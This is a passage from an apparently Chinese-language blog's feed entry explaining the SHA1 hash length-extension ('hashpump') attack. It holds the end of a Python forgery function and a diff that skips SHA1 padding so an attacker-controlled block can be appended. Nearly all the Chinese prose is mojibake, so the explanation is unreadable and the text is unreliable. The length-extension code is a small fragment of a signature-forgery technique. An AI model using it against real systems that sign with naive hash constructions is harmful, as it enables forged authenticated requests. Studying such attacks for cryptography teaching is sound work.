ä½†æœ€åè®¡ç®—æ—¶åªéœ€è¦æœ€åä¸€å—å°±è¡Œ, å› ä¸ºå·²ç»å°†å¯„å­˜å™¨è®¾ä¸ºä¹‹å‰çš„ç®—å‡ºæ¥çš„ç»“æœ</span></span><br><span class="line">    sha1.msg = bytearray(newmsg)</span><br><span class="line">    <span class="keyword">return</span> (retmsg, sha1.hexdigest())</span><br></pre></td></tr></table></figure><p><code>SHA1</code> åŸºæœ¬æ¥è‡ªäº<a href="https://github.com/rmb122/Cryptography/blob/master/SHA1.py" target="_blank" rel="noopener">å¯†ç å­¦ä½œä¸š</a>, ç¨å¾®ä¿®æ”¹ä¸€ä¸‹, å› ä¸ºè¿™é‡Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ§åˆ¶ä¸€ä¸ª <code>Block</code>, æ˜¯å·²ç» <code>padding</code> è¿‡çš„äº†,<br>ä¸ç”¨é‡å¤, æ‰€ä»¥æŠŠç®—ç»“æœä¹‹å‰çš„ <code>padding</code> ç»™è·³è¿‡.  </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">138c138</span><br><span class="line">&lt;         # self.__padding()</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;         self.__padding()</span><br></pre></td></tr></table></figure><p>æœ€åå½“ç„¶æ˜¯èƒ½å®éªŒæˆåŠŸçš„~  </p><p><img src="https://i.loli.net/2019/05/11/5cd5a7015838e.png" alt="">  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨å­¦å®Œ MD5/SHA1 ä¹‹å, å¾ˆå¿«å°±èƒ½ææ‡‚ &lt;code&gt;hashpump&lt;/code&gt; çš„åŸç†, æœ¬è´¨æ˜¯å› ä¸ºç±» &lt;code&gt;MD&lt;/code&gt; å“ˆå¸Œå‡½æ•°&lt;br&gt;åŒ…æ‹¬ MD5, SHA1, SHA2 éƒ½æ˜¯å°†ä¿¡æ¯å¡«å……ä¸ºä¸€ä¸ª &lt;code&gt;Block&lt;/code&gt; é•¿åº¦çš„å€æ•°ä»¥ååˆ† &lt;code&gt;Block&lt;/code&gt; ä¸€è½®è½®è®¡ç®—çš„,&lt;br&gt;æœ€åè¾“å‡ºçš„æ˜¯å¯„å­˜å™¨æ‹¼æ¥åœ¨ä¸€èµ·çš„å€¼, æ‰€ä»¥å‡è®¾ç”¨ä»¥ä¸‹å…¬å¼è®¡ç®—ç­¾å  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="crypto" scheme="https://rmb122.com/tags/crypto/"/>
    
  </entry>
  
</feed>
